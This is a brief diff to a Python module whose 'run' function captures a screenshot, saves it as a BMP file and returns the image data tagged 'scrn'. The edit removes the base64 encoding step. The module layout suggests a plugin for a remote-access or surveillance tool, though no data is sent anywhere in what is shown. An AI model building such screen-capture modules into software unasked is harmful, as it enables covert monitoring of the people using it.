@@ -33,7 +33,7 @@ def run(**args):
 		imagefile.save('screenshot.bmp',optimize = True,quality = 95)
 		del imagefile
 		imagefile = open('screenshot.bmp')
-		imgstring = base64.b64encode(imagefile.read())
+		imgstring = imagefile.read()
 		del imagefile
 		return imgstring, "scrn"
 	except:
